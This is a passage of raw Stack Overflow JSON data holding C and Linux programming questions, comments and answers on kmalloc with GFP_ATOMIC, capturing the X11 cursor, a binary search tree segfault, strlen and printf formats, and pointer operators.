"score": 0, "creation_date": 1545859478, "post_id": 53936183, "comment_id": 94714608, "body": "Oh and if your real problem is that you need multiple-page blocks of memory, like Order 3 or 4, and as atomic allocations, then you&#39;re toast. That won&#39;t happen. You&#39;ll need to preallocate chunks that big in your own slab cache and make sure you refill the cache from non-atomic context when it gets low. The default kmalloc allocators will run out of multiple-page chunks very quickly."}, {"owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "reply_to_user": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1545859767, "post_id": 53936183, "comment_id": 94714705, "body": "@ZanLynx I&#39;ll try the workaround about <code>min_free_kbytes</code>. BTW you can post it as answer :) It is processing traffic faster than accept it, the problem is just with allocating which fails under these particular conditions."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545859794, "post_id": 53936183, "comment_id": 94714717, "body": "I can&#39;t back this with a reference right now, but my understanding is, that pages, which contain (non-dirty) cache data can indeed be allocated atomically, because the contents don&#39;t have to be written back to disk, hence there is no need to sleep. The contents can simply be discarded and the page can be allocated."}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1545859946, "post_id": 53936183, "comment_id": 94714763, "body": "Good information here, only a little out of date: <a href=\"https://lwn.net/Kernel/LDD3/\" rel=\"nofollow noreferrer\">lwn.net/Kernel/LDD3</a> especially Chapter 8."}, {"owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545859975, "post_id": 53936183, "comment_id": 94714774, "body": "@Ctx I would appreciate the details about non-dirty cached pages re-allocation."}, {"owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "edited": false, "score": 0, "creation_date": 1545860086, "post_id": 53936183, "comment_id": 94714804, "body": "@jww The question is not only about Linux tuning. It is about the linux-kernel development too."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545861027, "post_id": 53936183, "comment_id": 94715104, "body": "@red0ct Sorry, I can&#39;t find a reference which explicitly states this right now. But all descriptions for <code>kmalloc()</code> state, that it allocates pages without sleeping; dropping a clean page containing cached data does not require kmalloc to sleep."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545861214, "post_id": 53936183, "comment_id": 94715160, "body": "But testing this theory should be easy... Fill the caches and load a module allocating single pages with GFP_ATOMIC until it fails. Then have a look at the free memory stats."}], "owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 238, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1545854622, "creation_date": 1545851657, "last_edit_date": 1592644375, "question_id": 53936183, "link": "https://stackoverflow.com/questions/53936183/linux-disk-cache-and-kmalloc-with-gfp-atomic", "title": "Linux disk cache and kmalloc with GFP_ATOMIC", "body": "<p>In some well-known <a href=\"https://www.linuxatemyram.com/\" rel=\"nofollow noreferrer\">article</a> there is such statement about the Linux disk cache:</p>\n<blockquote>\n<p>there's absolutely no reason to disable it!</p>\n</blockquote>\n<hr />\n<p>Also:</p>\n<blockquote>\n<p>A healthy Linux system with more than enough memory will, after running for a while, show the following expected and harmless behavior:</p>\n<ul>\n<li><p>free memory is close to 0</p>\n</li>\n<li><p>used memory is close to total</p>\n</li>\n<li><p>available memory (or &quot;free + buffers/cache&quot;) has enough room (let's say, 20%+ of total)</p>\n</li>\n<li><p>swap used does not change</p>\n</li>\n</ul>\n</blockquote>\n<p>These conditions are met in my case and there is a problem. I have some production kernel-mode networking code which has to allocate memory in <a href=\"https://lwn.net/Articles/274695/\" rel=\"nofollow noreferrer\">&quot;atomic&quot; context</a> (<code>kmalloc()</code> with <code>GFP_ATOMIC</code> flag set). So under the high load as expected while <em>&quot;free memory is close to 0&quot;</em> my code can't allocate memory and then eventually it becomes a denial-of-service.</p>\n<p>Obviously <code>cron</code> with <code>sync &amp;&amp; echo 3 &gt; /proc/sys/vm/drop_caches</code> is not a solution due to disk performance issues. It's possible just to try to choose some set of files to turn off caching on them, however it does not seem the good and reliable solution.</p>\n<p>The questions are:</p>\n<ul>\n<li>What is the proper and reliable solution in such case? (from kernel-mode or user-mode side or both)</li>\n<li>Why does it considered that there can be no reason to disable (reduce intensity of) disk cache?</li>\n</ul>\n<p>Some posts that didn't help me: <a href=\"https://stackoverflow.com/questions/20215516/disabling-disk-cache-in-linux\">1</a> and <a href=\"https://stackoverflow.com/questions/15266115/read-file-without-disk-caching-in-linux\">2</a>.</p>\n"}, {"tags": ["c", "image", "x11", "opencv3.0", "xorg"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545852475, "post_id": 53936158, "comment_id": 94712683, "body": "The cursor may not even be part of the image but generated in hardware. If not, it&#39;s usually undesirable to include in an image, as its position may be arbitrary and it isn&#39;t even part of the image anyway."}, {"owner": {"reputation": 173, "user_id": 9247555, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a37f86fb7734c02041b7e834521a1e43?s=128&d=identicon&r=PG&f=1", "display_name": "Bms bharadwaj", "link": "https://stackoverflow.com/users/9247555/bms-bharadwaj"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545854033, "post_id": 53936158, "comment_id": 94713095, "body": "Sir I didn&#39;t actually get by the phrase &#39;... but generated in hardware&#39;. Does that mean the cursor-concept is something very different from normal window concept, such that it always stays above all windows (including root window) ? Or something else?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545854263, "post_id": 53936158, "comment_id": 94713168, "body": "It&#39;s a horrible problem generating a cursor over a dynamic screen display. If it&#39;s part of the image displayed, it has to be removed for reading and writing to the image displayed, so it is easier to find a hardware solution, where the device is given bitmap mask(s) and a location."}, {"owner": {"reputation": 173, "user_id": 9247555, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a37f86fb7734c02041b7e834521a1e43?s=128&d=identicon&r=PG&f=1", "display_name": "Bms bharadwaj", "link": "https://stackoverflow.com/users/9247555/bms-bharadwaj"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545883436, "post_id": 53936158, "comment_id": 94718753, "body": "@WeatherVane So Sir is it impossible to get the cursor image or, can we create a copy of the cursor and then take its image ?"}], "answers": [{"comments": [{"owner": {"reputation": 173, "user_id": 9247555, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a37f86fb7734c02041b7e834521a1e43?s=128&d=identicon&r=PG&f=1", "display_name": "Bms bharadwaj", "link": "https://stackoverflow.com/users/9247555/bms-bharadwaj"}, "edited": false, "score": 0, "creation_date": 1546026073, "post_id": 53963356, "comment_id": 94764692, "body": "Can you please tell how to composite the cursor in the image ?"}], "tags": [], "owner": {"reputation": 464, "user_id": 2696475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fa3d62dda3410946b8eea5685b0f054?s=128&d=identicon&r=PG&f=1", "display_name": "FrodeTennebo", "link": "https://stackoverflow.com/users/2696475/frodetennebo"}, "is_accepted": false, "score": 0, "last_activity_date": 1546024894, "creation_date": 1546024894, "answer_id": 53963356, "question_id": 53936158, "link": "https://stackoverflow.com/questions/53936158/mouse-pointer-missing-in-xgetimage/53963356#53963356", "title": "Mouse pointer missing in XGetImage()", "body": "<p>No.  <code>XGetImage()</code> retrieves the drawable from the server.  The server takes all drawables and performs the composition to the screen hardware.  In this process, the cursor is a separate entity, possibly a hardware cursor.  If you want a to include the cursor in your image, you need to composite this into the image yourself.</p>\n"}], "owner": {"reputation": 173, "user_id": 9247555, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a37f86fb7734c02041b7e834521a1e43?s=128&d=identicon&r=PG&f=1", "display_name": "Bms bharadwaj", "link": "https://stackoverflow.com/users/9247555/bms-bharadwaj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 113, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1546024894, "creation_date": 1545851513, "question_id": 53936158, "link": "https://stackoverflow.com/questions/53936158/mouse-pointer-missing-in-xgetimage", "title": "Mouse pointer missing in XGetImage()", "body": "<p>When I use XGetImage() to take the image of a window, say the root window for example, the mouse pointer never occurs in the saved image (in .png format using opencv3). </p>\n\n<p>So, is there a method to get the cursor also in the final image taken using XGetImage() (or any similar function in x11) ?\nI didn't find any such function that does the job.</p>\n\n<p>About XGetImage():\n<a href=\"https://tronche.com/gui/x/xlib/graphics/XGetImage.html\" rel=\"nofollow noreferrer\">https://tronche.com/gui/x/xlib/graphics/XGetImage.html</a>\nI didn't find any such function that does the job.</p>\n"}, {"tags": ["c", "segmentation-fault", "binary-tree", "binary-search-tree"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1545851593, "post_id": 53936139, "comment_id": 94712412, "body": "A good start would be to <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">learn how to debug your programs</a>."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1545851665, "post_id": 53936139, "comment_id": 94712431, "body": "Also, it could be good to understand what happens with <code>name = malloc(sizeof(char) *MAX_STR)</code> directly followed by <code>snprintf(name, MAX_STR, &quot;%s&quot;,name)</code>. The latter which is explicitly <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\"><i>undefined behavior</i></a> by the way."}, {"owner": {"reputation": 5175, "user_id": 4370109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UcQgO.jpg?s=128&g=1", "display_name": "Brian Tompsett - \u6c64\u83b1\u6069", "link": "https://stackoverflow.com/users/4370109/brian-tompsett-%e6%b1%a4%e8%8e%b1%e6%81%a9"}, "edited": false, "score": 0, "creation_date": 1545851671, "post_id": 53936139, "comment_id": 94712435, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/33047452/definitive-list-of-common-reasons-for-segmentation-faults\">Definitive List of Common Reasons for Segmentation Faults</a>"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1545853094, "post_id": 53936139, "comment_id": 94712831, "body": "<code>if(bst == NULL){ bst-&gt;root = new; }</code> brilliant!"}, {"owner": {"reputation": 26552, "user_id": 448932, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QgLLl.png?s=128&g=1", "display_name": "500 - Internal Server Error", "link": "https://stackoverflow.com/users/448932/500-internal-server-error"}, "edited": false, "score": 0, "creation_date": 1545854666, "post_id": 53936139, "comment_id": 94713290, "body": "Also, don&#39;t allocate a new node until you reach the leaf where it should have been. Then, when you do allocate it, return it so that it can be linked into the tree by assigning the result to left or right in the parent."}], "answers": [{"tags": [], "owner": {"reputation": 804, "user_id": 5893772, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/EATNh.png?s=128&g=1", "display_name": "Reticulated Spline", "link": "https://stackoverflow.com/users/5893772/reticulated-spline"}, "is_accepted": true, "score": 0, "last_activity_date": 1545854359, "creation_date": 1545854359, "answer_id": 53936555, "question_id": 53936139, "link": "https://stackoverflow.com/questions/53936139/how-do-i-remove-this-segmentation-fault-in-my-bst-insert-node-function/53936555#53936555", "title": "How do I remove this segmentation fault in my bst_insert_node function?", "body": "<p>One possible segfault is here:</p>\n\n<pre><code>if(bst == NULL){\n    bst-&gt;root = new;\n}\n</code></pre>\n\n<p>You can't assign anything to members of bst as it's null. Perhaps you meant to construct a new BST here? A few other notes...</p>\n\n<ul>\n<li>Personally, I would avoid using the token <code>new</code> as it's going to confuse C++ programmers.</li>\n<li>The result of malloc should be checked in case it fails, but more importantly <code>snprintf()</code> shouldn't be writing to the buffer it's reading from.</li>\n</ul>\n"}], "owner": {"reputation": 3, "user_id": 10760197, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/voAOY.png?s=128&g=1", "display_name": "Marcas", "link": "https://stackoverflow.com/users/10760197/marcas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 124, "favorite_count": 0, "accepted_answer_id": 53936555, "answer_count": 1, "score": 0, "last_activity_date": 1545854359, "creation_date": 1545851369, "last_edit_date": 1545851625, "question_id": 53936139, "link": "https://stackoverflow.com/questions/53936139/how-do-i-remove-this-segmentation-fault-in-my-bst-insert-node-function", "title": "How do I remove this segmentation fault in my bst_insert_node function?", "body": "<p>I am having a segmentation fault in my function <code>bst_insert_node()</code>. Left is the left \"child\" of the node which always has a smaller phone value than it's parent. Right is the right \"child\" of the node which always has a greater phone value than it's parent. Bst stands for binary search tree. My main function is inside another file. The main problem should be my function <code>bst_insert_node()</code>.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include \"introprog_telefonbuch.h\"\n\n// Adds a node with the given phone number (phone) and the name of the owner of that phone number\n// into the binary search tree.\n\nvoid bst_insert_node(bstree* bst, unsigned long phone, char *name) {\n\nbst_node* new = malloc(sizeof(bst_node));\nname = malloc(sizeof(char) *MAX_STR);\nsnprintf(name, MAX_STR, \"%s\",name);\nnew-&gt;left = NULL;\nnew-&gt;right = NULL;\nnew-&gt;parent = NULL;\nnew-&gt;phone = phone;\n\nif(bst == NULL){\nbst-&gt;root = new;\n}\n\nbst_node* finder = bst-&gt;root;\n\nwhile(finder != NULL){\nif(finder-&gt;phone == phone){\n  printf(\"This phone number already exist\");\n  return;\n}\nif(phone &lt; finder-&gt;phone){\n  if(finder-&gt;left == NULL){\n    new-&gt;parent = finder;\n    finder-&gt;left = new;\n    return;\n  }\n  finder = finder-&gt;left;\n}\n\n\nif(phone &gt; finder-&gt;phone){\n  if(finder-&gt;right == NULL){\n    new-&gt;parent = finder;\n    finder-&gt;right = new;\n    return;\n  }\n\n  finder = finder-&gt;right;\n}\n}\n}\n\n// This function returns a pointer that points to the node that contains the phone\n// number that is being searched. If such a phone number is non existent,\n// you return NULL.\nbst_node* find_node(bstree* bst, unsigned long phone) {\n\nbst_node* finder = bst-&gt;root;\n\nwhile(finder != NULL){                       \n\nif(finder-&gt;phone == phone){ \n    return finder;\n}\n\nif(finder-&gt;phone &gt; phone){\n    finder = finder-&gt;left;\n}  \nelse{\n    finder = finder-&gt;right;\n} \n\n }\n  return NULL;\n}\n\n// print a sub-tree in \"in-order\" order\nvoid bst_in_order_walk_node(bst_node* node) {\n\nif (node == NULL){\nreturn;\n}\n\nelse{\nbst_in_order_walk_node(node-&gt;left);\nprint_node(node);\nbst_in_order_walk_node(node-&gt;right);\n}\n}\n\n// the same as bst_in_order_walk_node just that you do it for the whole tree.\nvoid bst_in_order_walk(bstree* bst) {\n    if (bst != NULL) {\n        bst_in_order_walk_node(bst-&gt;root);\n}\n}\n\n// deletes the all sub-tree of node\nvoid bst_free_subtree(bst_node* node) {\n    if(node == NULL){\n        return;\n }\n else{\n    bst_free_subtree(node-&gt;left);\n    bst_free_subtree(node-&gt;right);\n    free(node-&gt;name);\n    free(node);\n }\n }\n\n // Deletes the whole tree\n void bst_free_tree(bstree* bst) {\n    if(bst != NULL &amp;&amp; bst-&gt;root != NULL) {\n        bst_free_subtree(bst-&gt;root);\n        bst-&gt;root = NULL;\n}\n}\n</code></pre>\n\n<p>Here's the the main and interface function:</p>\n\n<pre><code>// Kreiert eine Benutzeroberfl\u00e4che\nbstree* interface(bstree *bst) {\n    help();\n    char *operation;\n    unsigned long phone;\n    char *name;\n    read_line_context in;\n    open_stdin(&amp;in);\n    printf(\"&gt; \");\n    while (read_line(&amp;in, &amp;operation, &amp;phone, &amp;name) == 0) {\n        if (operation != NULL) {\n            if (operation[0] == '?' &amp;&amp; phone &gt; 0) {\n                find_and_print(bst, phone);\n            } else if (operation[0] == '+' &amp;&amp; phone &gt; 0 &amp;&amp; strlen(name) &gt; 0) {    \n                bst_insert_node(bst, phone, name);\n            } else if (operation[0] == 'd') {\n                debug(bst);\n            } else if (operation[0] == 'p') {\n                bst_in_order_walk(bst);\n            } else if (operation[0] == 'q') {\n                break;\n            } else {\n                printf(\"Inkorrekte Eingabe\\n\\n\");\n                help();\n            }\n        }\n        printf(\"&gt; \");\n        phone = -1;\n    }\n    printf(\"Exiting...\\n\");\n    close_file(&amp;in);\n    return bst;\n    }\n\nint main(int argc, char** argv) {\n    // Create an empty search tree\n    bstree bst;\n    bst.root = NULL;\n    bst.count = 0;\n\n    if (argc != 2)\n    {\n        printf(\"Nutzung: %s &lt;Dateiname&gt;\\n\",argv[0]);\n        return 1;\n    }\n\n    // reading the txt file\n    read_file(argv[1], &amp;bst);\n\n    // creating the interface\n    interface(&amp;bst);\n\n    bst_free_tree(&amp;bst);\n\n    return 0;\n    }\n</code></pre>\n\n<p>The program is supposed to take a text file which contains all of the phone numbers and the names and put it into a binary search tree. My program is compiling, but for some reason when I press \"p\" (pressing p should show you the \"in-order\" sorted phone numbers), no phone numbers show up and the program just waits for another input again.</p>\n"}, {"tags": ["c", "memory", "stack", "size", "buffer"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1545850873, "post_id": 53935984, "comment_id": 94712150, "body": "Is <code>input</code> a null-terminated byte-string? Then that&#39;s the usual way to get its length. <b><i>However</i></b> note that <a href=\"https://en.cppreference.com/w/c/string/byte/strlen\" rel=\"nofollow noreferrer\">the <code>strlen</code> function</a> returns a value of type <code>size_t</code> (as your variable is) and the correct format to print a <code>size_t</code> is <code>&quot;%zu&quot;</code>  (if you see e.g. <a href=\"https://en.cppreference.com/w/c/io/fprintf\" rel=\"nofollow noreferrer\">this <code>printf</code> (and family) reference</a>)."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 1, "creation_date": 1545851100, "post_id": 53935984, "comment_id": 94712229, "body": "You didn&#39;t show the definition of <code>input</code>, but if it&#39;s an array, like <code>char input[1024]</code>, then <code>sizeof input</code> would be the size of the buffer, which would not equal <code>strlen(input)</code>, the length of the string. But if it&#39;s a pointer (<code>char *input</code>), you cannot (portably) get the size of the area of memory pointed to by it."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1545856083, "post_id": 53935984, "comment_id": 94713683, "body": "@3294833840_ <code>printf(&quot;buffer: &lt;%s&gt;, len: %zu\\n&quot;, input, len);</code>  Is there something more than that that you seek?"}], "answers": [{"tags": [], "owner": {"reputation": 356, "user_id": 7850159, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-waMjeDlXzRE/AAAAAAAAAAI/AAAAAAAAAJM/-nICyEJzQxg/photo.jpg?sz=128", "display_name": "sundb", "link": "https://stackoverflow.com/users/7850159/sundb"}, "is_accepted": false, "score": 0, "last_activity_date": 1545896839, "creation_date": 1545896839, "answer_id": 53941533, "question_id": 53935984, "link": "https://stackoverflow.com/questions/53935984/how-to-print-length-of-memory-and-buffer/53941533#53941533", "title": "How to print length of memory and buffer?", "body": "<p>You can use the custom malloc method, which comes from redis</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nvoid* zmalloc(size_t size) {\n    void* ptr = malloc(size + sizeof(size_t));\n    *((size_t*)ptr) = size;\n    return ptr + sizeof(size_t);\n}\n\nsize_t zmalloc_size(void* ptr) {\n    void* real_ptr = ptr - sizeof(size_t);\n    return *((size_t*)real_ptr);\n}\n\nint main() {\n    void* ptr = zmalloc(100);\n    printf(\"%zu\", zmalloc_size(ptr));\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10812584, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dfa57f6d3b04607065c5957c9e7fbdf9?s=128&d=identicon&r=PG&f=1", "display_name": "3294833840_", "link": "https://stackoverflow.com/users/10812584/3294833840"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 86, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1545896839, "creation_date": 1545850573, "last_edit_date": 1545851010, "question_id": 53935984, "link": "https://stackoverflow.com/questions/53935984/how-to-print-length-of-memory-and-buffer", "title": "How to print length of memory and buffer?", "body": "<p>I need to print size of memomry and buffer?</p>\n\n<p>is their another way?</p>\n\n<pre><code>size_t len;\nlen = strlen(input);\nprintf(\"******************len is : %d\\n\", len)\n</code></pre>\n\n<p>I have just edited my question where 'input' is actually 'buffer'</p>\n"}, {"tags": ["c", "pointers"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1545856368, "post_id": 53935936, "comment_id": 94713745, "body": "Note: If <code>p</code> is not a pointer, <code>&amp;*p</code> will not compile, yet <code>*&amp;p</code> will."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1545862153, "post_id": 53935936, "comment_id": 94715406, "body": "@chux if <code>p</code> is not a pointer or will not be converted to one, then..."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545862557, "post_id": 53935936, "comment_id": 94715511, "body": "@AnttiHaapala True, <code>p</code> could be an array."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1545886459, "post_id": 53935936, "comment_id": 94719255, "body": "... or a function ;)"}], "answers": [{"comments": [{"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1545852233, "post_id": 53935974, "comment_id": 94712622, "body": "6.5.3.2p3 states that <code>&amp;*</code> cancels out, but doesn&#39;t say anything about <code>*&amp;</code>."}, {"owner": {"reputation": 464288, "user_id": 34509, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/7FnYg.jpg?s=128&g=1", "display_name": "Johannes Schaub - litb", "link": "https://stackoverflow.com/users/34509/johannes-schaub-litb"}, "edited": false, "score": 0, "creation_date": 1545861727, "post_id": 53935974, "comment_id": 94715299, "body": "What happens if <code>p</code> is concurrently modified by another thread? I take it that <code>&amp;*</code> is undefined behavior then, but <code>*&amp;</code> is not, at least not intrinsically (i.e you could say <code>&amp;*&amp;</code>, put a <code>&amp;</code> in front of everything to prevent a read)."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 3, "last_activity_date": 1545850515, "creation_date": 1545850515, "answer_id": 53935974, "question_id": 53935936, "link": "https://stackoverflow.com/questions/53935936/difference-between-p-vs-p/53935974#53935974", "title": "Difference between `*&amp;p` vs `&amp;*p`?", "body": "<p>Lets draw your variables:</p>\n\n<pre>\n+---+     +---+\n| p | --> | a |\n+---+     +---+\n</pre>\n\n<p>That is, <code>p</code> is pointing to <code>a</code>.</p>\n\n<p>Now if you do <code>&amp;*p</code> then you first dereference <code>p</code> to get <code>a</code>, then you get the address of <code>a</code>, which leaves you with a pointer to <code>a</code>.</p>\n\n<p>If we take <code>*&amp;p</code> then you get the address of <code>p</code> to get a pointer to <code>p</code>, then you dereference that pointer to get <code>p</code>. Which is a pointer to <code>a</code>.</p>\n\n<p>So while the expressions do different things, the end result is the same: A pointer to <code>a</code>.</p>\n\n<p>And a descent compiler would probably just do nothing at all, since the dereference operator <code>*</code> and address-of operator <code>&amp;</code> together will always cancel each other out, no matter in which order they are.</p>\n"}, {"tags": [], "owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "is_accepted": false, "score": 0, "last_activity_date": 1545850866, "last_edit_date": 1545850866, "creation_date": 1545850528, "answer_id": 53935977, "question_id": 53935936, "link": "https://stackoverflow.com/questions/53935936/difference-between-p-vs-p/53935977#53935977", "title": "Difference between `*&amp;p` vs `&amp;*p`?", "body": "<p>In this context, <code>&amp;</code> takes the address (i.e., informally \"adds <code>*</code>\" to the type of the expression). Meanwhile <code>*</code> dereferences a pointer 